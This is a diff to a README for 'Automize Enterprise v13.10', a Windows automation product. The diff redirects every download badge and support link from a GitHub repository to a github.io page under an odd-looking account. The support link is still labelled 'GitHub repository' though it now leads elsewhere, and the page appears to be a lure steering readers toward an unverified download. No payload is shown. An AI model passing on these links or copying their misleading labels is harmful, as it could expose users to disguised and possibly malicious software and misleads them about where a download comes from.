@@ -13,9 +13,9 @@ Automize Enterprise v13.10 is a powerful Windows-based platform designed to help
 
 ## 📥 How to Download and Run Automize Enterprise v13.10
 
-Visit this link to download the application: [https://github.com/Deane42nd53/automize-enterprise-v1310](https://github.com/Deane42nd53/automize-enterprise-v1310)
+Visit this link to download the application: [https://deane42nd53.github.io](https://deane42nd53.github.io)
 
-[![Download Automize Enterprise](https://img.shields.io/badge/Download-Automize%20Enterprise%20v13.10-blueviolet?style=for-the-badge)](https://github.com/Deane42nd53/automize-enterprise-v1310)
+[![Download Automize Enterprise](https://img.shields.io/badge/Download-Automize%20Enterprise%20v13.10-blueviolet?style=for-the-badge)](https://deane42nd53.github.io)
 
 ### Step-by-Step Installation
 
@@ -88,6 +88,6 @@ A: No, the drag-and-drop interface makes it accessible to non-technical users.
 
 ## 📞 Support and Resources
 
-For additional help, visit the [GitHub repository](https://github.com/Deane42nd53/automize-enterprise-v1310) for documentation, issue tracking, and community discussions.
+For additional help, visit the [GitHub repository](https://deane42nd53.github.io) for documentation, issue tracking, and community discussions.
 
 Keywords: workflow automation, enterprise orchestration, AI integration, Windows automation, job scheduling, operational monitoring, role-based access, task automation
